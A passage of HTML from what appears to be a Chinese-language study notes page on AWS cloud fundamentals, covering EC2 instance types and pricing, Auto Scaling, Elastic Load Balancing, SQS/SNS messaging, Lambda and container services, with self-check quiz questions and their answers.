決定伺服器可以接收請求的類型、是否可公開/私有方式存取</span><br><span class="line">  |</span><br><span class="line">  |- 優點</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 將預付成本轉成變動成本</span><br><span class="line">  |   |- 停止將資金花費在執行和維護資料中心上</span><br><span class="line">  |   |- 無需猜測容量</span><br><span class="line">  |   |- 受益於大範圍規模經濟</span><br><span class="line">  |   |- 提升速度和敏捷性</span><br><span class="line">  |   |- 快速進入全球市場</span><br><span class="line">  |</span><br><span class="line">  |- 雲端運算的部署模型</span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 以雲端為基礎進行部屬</span></span><br><span class="line"><span class="code">      |   |- 在雲端中執行完整的應用程式</span></span><br><span class="line"><span class="code">      |   |- 將現有的應用程式遷移至雲端</span></span><br><span class="line"><span class="code">      |   |- 在雲端中設計和建立新的應用程式</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 內部部屬之部署方式</span></span><br><span class="line"><span class="code">      |   |- 透過虛擬化和資源管理工具部署資源</span></span><br><span class="line"><span class="code">      |   |- 運用應用程式管理和虛擬化技術提高資源使用率</span></span><br><span class="line"><span class="code">      |</span></span><br><span class="line"><span class="code">      |- 混合部署</span></span><br><span class="line"><span class="code">          |- 將雲端資源連接到內部部署基礎設施</span></span><br><span class="line"><span class="code">          |- 整合雲端資源與傳統 IT 應用程式</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>當虛擬機器共用主機的資源時，Hypervisor 會負責將虛擬機器彼此分隔</li>
-<li>這表示 EC2 執行個體很安全。即使它們會共用資源，某個 EC2 執行個體並無法感知到該主機上是否存在任何其他 EC2 執行個體</li>
-<li>它們會彼此分隔，並受到保護</li>
-<li>CaaS 運算即服務</li>
-</ul>
-<h2 id="Amazon-EC2-執行個體類型"><a href="#Amazon-EC2-執行個體類型" class="headerlink" title="Amazon EC2 執行個體類型"></a><strong>Amazon EC2 執行個體類型</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 執行個體類型</span><br><span class="line">│</span><br><span class="line">├── 一般用途執行個體</span><br><span class="line">│   ├── 平衡運算、記憶體、網路資源</span><br><span class="line">│   ├── 適用於各種工作負載，如應用程式伺服器、遊戲伺服器等</span><br><span class="line">│</span><br><span class="line">├── 運算最佳化執行個體</span><br><span class="line">│   ├── 專為運算密集型任務設計</span><br><span class="line">│   ├── 適用於高效能 Web 伺服器、運算密集的應用程式伺服器等</span><br><span class="line">│   ├── 批次處理工作負載</span><br><span class="line">│</span><br><span class="line">├── 記憶體最佳化執行個體</span><br><span class="line">│   ├── 專為處理大型資料集的工作負載設計</span><br><span class="line">│   ├── 適合記憶體密集型任務</span><br><span class="line">│   ├── 適用於高效能資料庫、即時處理大量資料的工作負載等</span><br><span class="line">│</span><br><span class="line">├── 加速運算執行個體</span><br><span class="line">│   ├── 使用硬體加速器提高效率</span><br><span class="line">│   ├── 用於浮點數計算、圖形處理，或是資料模式比對</span><br><span class="line">│   ├── 適用於圖形應用程式、遊戲串流等</span><br><span class="line">│   ├── 採用硬體加速器</span><br><span class="line">│</span><br><span class="line">└── 儲存最佳化執行個體</span><br><span class="line"><span class="code">    ├── 專為處理超大型資料集的存取工作負載設計</span></span><br><span class="line"><span class="code">    ├── 適用於分散式檔案系統、資料倉儲應用程式等</span></span><br><span class="line"><span class="code">    ├── 需要對本機儲存資料進行高效能處理的工作負載</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
-<li>什麼 Amazon EC2 執行個體類型適合資料倉儲應用？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
-<li><input checked="" disabled="" type="checkbox"> 儲存最佳化</li>
-<li><input disabled="" type="checkbox"> 一般用途</li>
-<li><input disabled="" type="checkbox"> 運算最佳化</li>
-</ul>
-<ol>
-<li>哪一種 Amazon EC2 執行個體類型可以取得運算、記憶體和連網資源的平衡？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
-<li><input disabled="" type="checkbox"> 儲存最佳化</li>
-<li><input checked="" disabled="" type="checkbox"> 一般用途</li>
-<li><input disabled="" type="checkbox"> 運算最佳化</li>
-</ul>
-<ol>
-<li>什麼 Amazon EC2 執行個體類型最適合高效能資料庫？</li>
-</ol>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 記憶體最佳化</li>
-<li><input disabled="" type="checkbox"> 儲存最佳化</li>
-<li><input disabled="" type="checkbox"> 一般用途</li>
-<li><input disabled="" type="checkbox"> 運算最佳化</li>
-</ul>
-<ol>
-<li>哪一種 Amazon EC2 執行個體類型提供高效能處理器？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
-<li><input disabled="" type="checkbox"> 儲存最佳化</li>
-<li><input disabled="" type="checkbox"> 一般用途</li>
-<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
-</ul>
-<h2 id="Amazon-EC2-定價"><a href="#Amazon-EC2-定價" class="headerlink" title="Amazon EC2 定價"></a><strong>Amazon EC2 定價</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 定價選項</span><br><span class="line">├── 隨需定價</span><br><span class="line">│   ├── 執行個體執行的時間長度付費</span><br><span class="line">│   ├── 適用於不可中斷的短期不定期工作負載</span><br><span class="line">│   ├── 無需預付成本或最低合約</span><br><span class="line">│   ├── 適用於開發、測試應用程式等使用模式無法預測的情況</span><br><span class="line">├── 預留執行個體</span><br><span class="line">│   ├── 標準預留執行個體</span><br><span class="line">│   │   ├── 適用於穩定狀態的應用程式</span><br><span class="line">│   │   ├── 提前承諾一定的用量以獲得折扣</span><br><span class="line">│   │   ├── 可選擇 EC2 執行個體類型、大小、作業系統、租用等</span><br><span class="line">│   ├── 可轉換預留執行個體</span><br><span class="line">│       ├── 適用於需要在不同區域或不同執行個體類型中執行的情況</span><br><span class="line">│       ├── 提供更高折扣並具有更大靈活性</span><br><span class="line">├── EC2 執行個體 Savings Plans</span><br><span class="line">│   ├── 提供折扣，最多可節省72%，需承諾一定的用量和時間</span><br><span class="line">│   ├── 無需指定 EC2 執行個體類型和大小、作業系統和租用</span><br><span class="line">│   ├── 對執行個體系列和區域做出 1 年期或 3 年期的每小時支出承諾，可降低 EC2 執行個體成本</span><br><span class="line">│   ├── 定價方式也適用於 AWS Fargate 和 AWS Lambda 用量</span><br><span class="line">├── Spot 執行個體</span><br><span class="line">│   ├── 適用於彈性或可承受中斷的工作負載</span><br><span class="line">│   ├── 最高可節省 90% 成本，但需承受執行個體可能中斷的風險</span><br><span class="line">│   |   ├── 容量不再可用或 Spot 執行個體的需求增加，個體可能會中斷</span><br><span class="line">├── 專用主機</span><br><span class="line"><span class="code">    ├── 提供完全專用的實體伺服器</span></span><br><span class="line"><span class="code">    ├── 可用於維持授權合規、購買隨需的專用主機和專用主機保留</span></span><br><span class="line"><span class="code">    ├── 專用主機價格最高</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
-<li>您指定多個 EC2 執行個體在一個區域中執行特定作業系統、執行個體系列和大小及租用時，哪個 Amazon EC2 定價選項可提供折扣？</li>
-</ol>
-<ul>
-<li><p><input disabled="" type="checkbox"> 
-可轉換預留執行個體</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-EC2 執行個體 Savings Plans</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-Spot 執行個體</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-標準預留執行個體</p>
-<blockquote>
-<p>標準預留執行個體要求您指定：</p>
-<ul>
-<li>執行個體系列和大小</li>
-<li>平台說明</li>
-<li>租用</li>
-<li>區域</li>
-</ul>
-<p>您指定數量的 EC2 執行個體涵蓋 1 年期或 3 年期</p>
-</blockquote>
-</li>
-</ul>
-<p>您對執行個體系列和區域做出 1 年期或 3 年期限的每小時支出承諾時，哪個 Amazon EC2 定價選項可提供折扣？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 隨需</li>
-<li><input checked="" disabled="" type="checkbox"> EC2 執行個體 Savings Plans</li>
-<li><input disabled="" type="checkbox"> Spot 執行個體</li>
-<li><input disabled="" type="checkbox"> 預留執行個體</li>
-</ul>
-<h2 id="擴展-Amazon-EC2"><a href="#擴展-Amazon-EC2" class="headerlink" title="擴展 Amazon EC2"></a><strong>擴展 Amazon EC2</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 的可擴展性和彈性</span><br><span class="line">│</span><br><span class="line">├── 內部部署資料中心的困境</span><br><span class="line">│   ├── 問題: 難以預測需求，容易出現資源閒置或不足的情況</span><br><span class="line">│   ├── 解決方案: AWS 提供的可擴展性和彈性服務</span><br><span class="line">│</span><br><span class="line">├── AWS 的解決方案</span><br><span class="line">│   ├── 可擴展性</span><br><span class="line">│   │   ├── 定義: 根據需求變化自動增減資源，確保足夠的運算容量</span><br><span class="line">│   │   ├── AWS 服務: Amazon EC2 Auto Scaling</span><br><span class="line">│   │   │   ├── 動態調整: 根據實際需求變化自動調整執行個體數量</span><br><span class="line">│   │   │   └── 預測擴展: 根據預測需求自動增減執行個體數量</span><br><span class="line">│   │   │       ├── 加速擴展: 同時使用動態調整和預測擴展</span><br><span class="line">│   │   │</span><br><span class="line">│   ├── 彈性</span><br><span class="line">│       ├── 定義: 建立具有高可用性和容錯能力的系統</span><br><span class="line">│       ├── 方法: 透過解耦和備援來達到</span><br><span class="line">│</span><br><span class="line">└── 關鍵概念</span><br><span class="line"><span class="code">    ├── 可擴展性: 根據實際需求自動調整資源量，確保足夠的運算容量</span></span><br><span class="line"><span class="code">    └── 彈性: 建立高可用性和容錯能力的系統，應對各種潛在問題</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>可擴展性</strong>意味著僅以所需資源開始使用，並且透過設計架構，藉由向外擴展或向內縮減來自動回應需求的變化</li>
-<li>只需為所用資源付費，不必擔心運算容量不足，無法滿足客戶需求</li>
-<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體</li>
-<li>藉由自動增減所需執行個體，可以維持更高的應用程式可用性</li>
-</ul>
-<p><img src="/img/AWS12_2.png" alt="Untitled"></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">應付成長的需求：向上擴展 vs. 水平擴展</span><br><span class="line">│</span><br><span class="line">├── 向上擴展</span><br><span class="line">│   ├── 定義: 為正在執行的電腦提供更多效能</span><br><span class="line">│   ├── 缺點: 增加單一執行個體的效能無法解決客戶需求變化的問題</span><br><span class="line">│</span><br><span class="line">├── 解耦系統的優勢</span><br><span class="line">│   ├── 解釋: 每個執行個體只負責特定的任務，不需增加執行個體來解決單一執行個體負載過大的問題</span><br><span class="line">│   └── 好處: 可根據需求調整每個部分的效能，避免過度佈建</span><br><span class="line">│</span><br><span class="line">└── 水平擴展的解決方案</span><br><span class="line"><span class="code">    ├── Amazon EC2 Auto Scaling</span></span><br><span class="line"><span class="code">    │   ├── 定義: 根據需求自動增減執行個體數量</span></span><br><span class="line"><span class="code">    │   ├── 功能:</span></span><br><span class="line"><span class="code">    │   │   ├── 最小容量: 確保至少有一個執行個體在運行</span></span><br><span class="line"><span class="code">    │   │   ├── 所需容量: 根據需求設定執行個體數量</span></span><br><span class="line"><span class="code">    │   │   └── 最大容量: 設定最大執行個體數量以避免過度擴展</span></span><br><span class="line"><span class="code">    │   └── 優點: 可以動態調整執行個體數量，節省成本並滿足客戶需求</span></span><br><span class="line"><span class="code">    └── 成本效益</span></span><br><span class="line"><span class="code">        └── 優勢: 只需支付實際使用的執行個體，節省成本並提供最佳客戶體驗</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<h2 id="透過-Elastic-Load-Balancing-導引流量"><a href="#透過-Elastic-Load-Balancing-導引流量" class="headerlink" title="透過 Elastic Load Balancing 導引流量"></a><strong>透過 Elastic Load Balancing 導引流量</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">負載平衡器 (Load Balancer)</span><br><span class="line">│</span><br><span class="line">├── 負載平衡器的作用</span><br><span class="line">│   ├── 解釋: 負責將傳入的請求路由到多個執行個體進行處理</span><br><span class="line">│   └── 目的: 確保每個執行個體的工作負載均衡，提高效能和可用性</span><br><span class="line">│</span><br><span class="line">├── 需要負載平衡器的情況</span><br><span class="line">│   ├── 客戶需求不平均: 導致某些執行個體負載過大，而其他閒置</span><br><span class="line">│   ├── 需要將請求路由到正確的執行個體: 解決多個執行個體間的流量路由問題</span><br><span class="line">│   └── 需要高效能、成本效益、高度可用、自動擴展的系統</span><br><span class="line">│</span><br><span class="line">└── Elastic Load Balancing (ELB)</span><br><span class="line"><span class="code">    ├── 定義: AWS 的一項受管服務，自動在多個執行個體之間分配傳入流量</span></span><br><span class="line"><span class="code">    ├── 特性:</span></span><br><span class="line"><span class="code">    │   ├── 高度可用: 在區域層級執行，具備高度可用性，無需額外操作</span></span><br><span class="line"><span class="code">    │   ├── 自動擴展: 可處理額外的輸送量，每小時成本維持不變</span></span><br><span class="line"><span class="code">    │   └── 自動調整: 根據執行個體的動態變化，自動調整負載</span></span><br><span class="line"><span class="code">    ├── 應用場景:</span></span><br><span class="line"><span class="code">    │   ├── 前端流量: 將傳入流量分配到多個前端執行個體中</span></span><br><span class="line"><span class="code">    │   └── 後端通訊: 將流量路由到最少負載的後端執行個體中</span></span><br><span class="line"><span class="code">    └── 重要性: ELB 和 Amazon EC2 Auto Scaling 共同運作，確保應用程式提供高效能和可用性</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如果您有多個 Amazon EC2 執行個體，Elastic Load Balancing 會將工作負載分配到多個執行個體，因此單一執行個體無須承載大部分工作負載</li>
-<li>雖然 Elastic Load Balancing 和 Amazon EC2 Auto Scaling 各為不同服務，但兩者共同運作時，有助於確保 Amazon EC2 中執行的應用程式能夠提供高效能和可用性。</li>
-</ul>
-<p><img src="/img/AWS12_3.png" alt="低需求期間"></p>
-<p>低需求期間</p>
-<p><img src="/img/AWS12_4.png" alt="高需求期間"></p>
-<p>高需求期間</p>
-<p><img src="/img/AWS12_5.png" alt="Untitled"></p>
-<p><img src="/img/AWS12_6.png" alt="Untitled"></p>
-<h2 id="訊息與佇列"><a href="#訊息與佇列" class="headerlink" title="訊息與佇列"></a><strong>訊息與佇列</strong></h2><p>重點 1: 訊息與佇列<br>符號: 📩</p>
-<ul>
-<li>定義: 將訊息放置在緩衝區中，以解耦應用程式元件之間的通訊。</li>
-<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師從佇列取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
-</ul>
-<p>重點 2: 緊湊耦合 vs. 鬆散耦合<br>符號: 🔗 vs. 🔗🔄</p>
-<ul>
-<li>定義:<ul>
-<li>緊湊耦合: 元件之間<strong>耦合緊密</strong>，一個元件的故障可能<strong>影響整個系統</strong>。</li>
-<li>鬆散耦合: 元件之間耦合<strong>較鬆散</strong>，一個元件的故障<strong>不會影響整個系統</strong>。</li>
-</ul>
-</li>
-<li>舉例流程:<ul>
-<li>緊湊耦合: 應用程式 A 直接傳送訊息給應用程式 B -&gt; B 故障 -&gt; A 開始發生錯誤</li>
-<li>鬆散耦合: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
-</ul>
-</li>
-</ul>
-<p>重點 3: AWS 服務: Amazon Simple Queue Service (SQS)<br>符號: 📨</p>
-<ul>
-<li>定義: 可在任何軟體元件之間傳送、存放和接收訊息的服務。</li>
-<li>舉例流程: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
-</ul>
-<p>重點 4: AWS 服務: Amazon Simple Notification Service (SNS)<br>符號: 📢</p>
-<ul>
-<li>定義: 透過發布&#x2F;訂閱模型將訊息傳送至服務或通知終端使用者的服務。</li>
-<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
-</ul>
-<p>重點 5: 單體式應用程式 vs. 微型服務<br>符號: ⬛ vs. 🔲</p>
-<ul>
-<li><p>定義:</p>
-<ul>
-<li><p>單體式應用程式: 元件之間耦合緊密，一個元件的故障可能導致整個應用程式失效。</p>
-<p>  <img src="/img/AWS12_7.png" alt="Untitled"></p>
-</li>
-<li><p>微型服務: 元件之間耦合較鬆散，一個元件的故障不會影響整個應用程式。</p>
-<p>  <img src="/img/AWS12_8.png" alt="Untitled"></p>
-</li>
-</ul>
-</li>
-<li><p>舉例流程:</p>
-<ul>
-<li>單體式應用程式: 元件耦合緊密 -&gt; 故障可能導致整個應用程式失效<ul>
-<li>具備緊耦合元件的應用程式，這些元件可能包括資料庫、伺服器、使用者介面、商業邏輯等</li>
-</ul>
-</li>
-<li>微型服務: 元件彼此鬆散耦合 -&gt; 故障不會影響整個應用程式<ul>
-<li>服務和元件滿足不同的功能</li>
-<li>有兩種服務可促成應用程式的整合：Amazon Simple Notification Service (Amazon SNS) 和 Amazon Simple Queue Service (Amazon SQS)</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">點餐流程 (單體式應用程式)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">點餐流程 (解耦式使用SQS)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; SQS (佇列) &lt;- 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">電子報發布流程 (SNS)：</span><br><span class="line">發布者 -&gt; SNS 主題 -&gt; 訂閱者</span><br><span class="line"></span><br><span class="line">訂單處理流程 (解耦式使用SQS)：</span><br><span class="line">收銀員 -&gt; SQS (佇列) &lt;- 咖啡師</span><br><span class="line"></span><br><span class="line">咖啡店的訂單流程：</span><br><span class="line"></span><br><span class="line">客人 --&gt; 收銀員：點餐</span><br><span class="line">收銀員 --&gt; 佇列：放入訂單</span><br><span class="line">佇列 --&gt; 咖啡師：取得訂單</span><br><span class="line">咖啡師 --&gt; 客人：製作飲料</span><br><span class="line">咖啡師 --&gt; 佇列：完成訂單移除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="知識檢測-2"><a href="#知識檢測-2" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
-<li>哪一種 AWS 服務是向訂閱者發布訊息的最佳選擇？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
-<li><input disabled="" type="checkbox"> Amazon EC2 Auto Scaling</li>
-<li><input checked="" disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
-<li><input disabled="" type="checkbox"> Elastic Load Balancing</li>
-</ul>
-<blockquote>
-<p>其他回答皆不正確，因為：</p>
-<ul>
-<li>Amazon Simple Queue Service (Amazon SQS) 是訊息佇列服務，它不會使用涉及 Amazon SNS 的訊息訂閱和主題模型。</li>
-<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體。</li>
-<li>Elastic Load Balancing 是一種可將傳入的應用程式流量自動分配到多個資源 (例如 Amazon EC2 執行個體) 的 AWS 服務。</li>
-</ul>
-</blockquote>
-<h2 id="其他運算服務"><a href="#其他運算服務" class="headerlink" title="其他運算服務"></a><strong>其他運算服務</strong></h2><p><img src="/img/AWS12_9.png" alt="Untitled"></p>
-<ul>
-<li>將程式碼上傳到 Lambda。</li>
-<li>將程式碼設定為從事件來源 (例如 AWS 服務、行動應用程式或 HTTP 端點) 觸發。</li>
-<li>Lambda 只會在觸發時執行程式碼。</li>
-<li>您只需為使用的運算時間支付費用。在前述的影像大小調整範例中，您只需針對上傳新影像時所用的運算時間付費。上傳影像會觸發 Lambda 執行調整影像大小的程式碼。</li>
-</ul>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 運算服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 靈活、可靠、高度可擴展</span><br><span class="line">│    ├─ 適用於各種使用案例</span><br><span class="line">│    ├─ 需要自行設定和管理執行個體機群</span><br><span class="line">│    └─ 試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</span><br><span class="line">├─ 無伺服器運算</span><br><span class="line">│    ├─ Lambda</span><br><span class="line">│    │    ├─ 無需佈建或管理這些伺服器環境，完全不想要管理基礎環境</span><br><span class="line">│    │    ├─ 只需專注於應用程式開發</span><br><span class="line">│    │    ├─ 每次觸發都會自動擴展函數</span><br><span class="line">│    │    └─ 託管短期執行的函數、服務導向或事件導向的應用程式</span><br><span class="line">│    └─ Fargate</span><br><span class="line">│         ├─ 可用於 ECS 或 EKS 的無伺服器運算平台</span><br><span class="line">│         ├─ 想要在 AWS 上執行 Docker 容器型工作負載(選擇工具 (ECS or EKS) -&gt; 選擇平台 (自行管理的EC2 or Fargate代替管理)</span><br><span class="line">│         └─ 不需管理基礎環境，只需專注於應用程式</span><br><span class="line">└─ 容器服務</span><br><span class="line"><span class="code">     ├─ ECS (Elastic Container Service)</span></span><br><span class="line"><span class="code">     │    ├─ 高度擴展的高效能容器管理系統</span></span><br><span class="line"><span class="code">     │    └─ 支援 Docker 容器</span></span><br><span class="line"><span class="code">     ├─ EKS (Elastic Kubernetes Service)</span></span><br><span class="line"><span class="code">     │    ├─ 全受管服務，用於在 AWS 上執行 Kubernetes</span></span><br><span class="line"><span class="code">     │    └─ 支援大規模部署和管理容器化應用程式</span></span><br><span class="line"><span class="code">     └─ 其他容器化服務</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">咖啡廳舉例的流程圖：</span><br><span class="line"></span><br><span class="line">咖啡廳</span><br><span class="line">├─ 顧客進入咖啡廳</span><br><span class="line">│    ├─ 選擇座位</span><br><span class="line">│    │    ├─ 在內用區域</span><br><span class="line">│    │    │    ├─ 選擇桌子</span><br><span class="line">│    │    │    └─ 坐下等待</span><br><span class="line">│    │    └─ 在外帶區域</span><br><span class="line">│    │         ├─ 排隊點餐</span><br><span class="line">│    │         └─ 等待取餐</span><br><span class="line">│    └─ 等待服務員接待</span><br><span class="line">│         ├─ 服務員接待顧客</span><br><span class="line">│         └─ 點餐</span><br><span class="line">└─ 顧客享用咖啡</span><br><span class="line"><span class="code">     ├─ 室內用餐</span></span><br><span class="line"><span class="code">     │    ├─ 服務員送上餐點</span></span><br><span class="line"><span class="code">     │    └─ 顧客享用</span></span><br><span class="line"><span class="code">     └─ 外帶</span></span><br><span class="line"><span class="code">          ├─ 服務員呼叫顧客取餐</span></span><br><span class="line"><span class="code">          └─ 顧客取餐</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
-
-<p><strong>無伺服器運算</strong></p>
-<p><img src="/img/AWS12_10.png" alt="Untitled"></p>
-<ul>
-<li>佈建執行個體 (虛擬伺服器)</li>
-<li>上傳程式碼</li>
-<li>在應用程式執行時繼續管理執行個體</li>
-</ul>
-<p>試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</p>
-<h2 id="第二單元總結"><a href="#第二單元總結" class="headerlink" title="第二單元總結"></a>第二單元總結</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">雲端運算</span><br><span class="line">└─ 定義：透過網際網路提供的 IT 資源隨需交付，採實支實付的定價形式</span><br><span class="line"></span><br><span class="line">AWS 服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 定義：動態啟動及關閉虛擬伺服器</span><br><span class="line">│    ├─ 類別：一般用途、運算最佳化、記憶體最佳化、加速運算、儲存最佳化</span><br><span class="line">│    └─ 擴展：垂直擴展、水平擴展 (使用 Auto Scaling)</span><br><span class="line">├─ 定價模式：隨需選項、Spot 定價、Savings Plans 或預留執行個體</span><br><span class="line">├─ Elastic Load Balancer：將傳入流量分配給 EC2 執行個體</span><br><span class="line">├─ 訊息服務：SQS (Simple Queue Service) 和 SNS (Simple Notification Service)</span><br><span class="line">├─ 容器服務：ECS (Elastic Container Service) 和 EKS (Elastic Kubernetes Service)</span><br><span class="line">├─ 無伺服器運算：AWS Lambda 和 AWS Fargate</span><br><span class="line">└─ Lambda：可直接上傳程式碼並設定觸發條件執行，只在實際執行程式碼時收費</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="單元二測驗"><a href="#單元二測驗" class="headerlink" title="單元二測驗"></a>單元二測驗</h3><ol>
-<li>如果您想要將 Amazon EC2 執行個體使用於批次處理工作負載，那麼最好使用哪種 Amazon EC2 執行個體類型？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> 一般用途</li>
-<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
-<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
-<li><input disabled="" type="checkbox"> 儲存最佳化</li>
-</ul>
-<blockquote>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>一般用途的執行個體會平衡使用計算、記憶體和網路資源。此執行個體系列對於這個案例中的應用程式並非最佳選擇。運算最佳化執行個體比一般用途的執行個體更適合批次處理的工作負載。</li>
-<li>記憶體最佳化執行個體較適合需處理記憶體中大型資料集的工作負載，例如高效能資料庫。</li>
-<li>儲存最佳化執行個體專為需要對本機儲存體上的大型資料集進行高量連續讀取和寫入存取的工作負載所設計。問題並未指定要處理的資料規模。批次處理的方式為分組處理資料。運算最佳化執行個體非常適合這種類型可從高效能處理器中受益的工作負載。</li>
-</ul>
-</blockquote>
-<ol>
-<li>Amazon EC2 預留執行個體的合約長度選項有哪些？(請選取兩個。)</li>
-</ol>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 1 年</li>
-<li><input disabled="" type="checkbox"> 2 年</li>
-<li><input checked="" disabled="" type="checkbox"> 3 年</li>
-<li><input disabled="" type="checkbox"> 4 年</li>
-<li><input disabled="" type="checkbox"> 5 年</li>
-</ul>
-<blockquote>
-<p>預留執行個體需要 1 年或 3 年的承諾。3 年期選項提供更高的折扣。</p>
-</blockquote>
-<ol>
-<li>您的工作負載總共會執行 6 個月，並且可以承受中斷，那麼最具成本效益的 Amazon EC2 購買選項是什麼？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> 預留執行個體</li>
-<li><input checked="" disabled="" type="checkbox"> Spot 執行個體</li>
-<li><input disabled="" type="checkbox"> 專用執行個體</li>
-<li><input disabled="" type="checkbox"> 隨需執行個體</li>
-</ul>
-<blockquote>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>預留執行個體需要 1 年或 3 年的合約期。此案例中的工作負載只會執行 6 個月。</li>
-<li>在單一客戶專用硬體上的 Virtual Private Cloud (VPC) 中執行的專用執行個體。這個選項比其他在共用硬體執行的選項具有更高成本。</li>
-<li>隨需執行個體符合僅執行 6 個月的需求。不過，Spot 執行個體才是最佳選擇，因為它不需要最低合約期，且能夠承受中斷，成本也低於隨需執行個體。</li>
-</ul>
-</blockquote>
-<ol>
-<li>哪個程序是 Elastic Load Balancing 的範例？</li>
-</ol>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 確保沒有任何一個 Amazon EC2 執行個體必須自行執行完整工作負載</li>
-<li><input disabled="" type="checkbox"> 在需求低時移除不需要的 Amazon EC2 執行個體</li>
-<li><input disabled="" type="checkbox"> 在線上商店的熱門銷售期間新增第二個 Amazon EC2 執行個體</li>
-<li><input disabled="" type="checkbox"> 自動調整 Amazon EC2 執行個體的數量，以便滿足需求</li>
-</ul>
-<blockquote>
-<p>Elastic Load Balancing 是一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務。這項特性有助於確保沒有任何一個資源會遭過度使用。</p>
-<p>其他選項都是 Auto Scaling 的範例。</p>
-</blockquote>
-<ol>
-<li>如果您想要部署和管理容器化的應用程式，您應該使用哪一種服務？</li>
-</ol>
-<ul>
-<li><input disabled="" type="checkbox"> AWS Lambda</li>
-<li><input disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
-<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
-<li><input checked="" disabled="" type="checkbox"> Amazon Elastic Kubernetes Service (Amazon EKS)</li>
-</ul>
-<blockquote>
-<p>Amazon EKS 是一項完全受管的 Kubernetes 服務。Kubernetes 是一種開放原始碼軟體，可讓您大規模部署和管理容器化應用程式。</p>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>AWS Lambda 這項服務用於讓您無需佈建或管理伺服器就能執行程式碼。</li>
-<li>Amazon Simple Queue Service (Amazon SQS) 這項服務用於讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
-<li>Amazon Simple Notification Service (Amazon SNS) 是一種發布&#x2F;訂閱服務。使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。</li>
-</ul>
-</blockquote>
 
       
     </div>
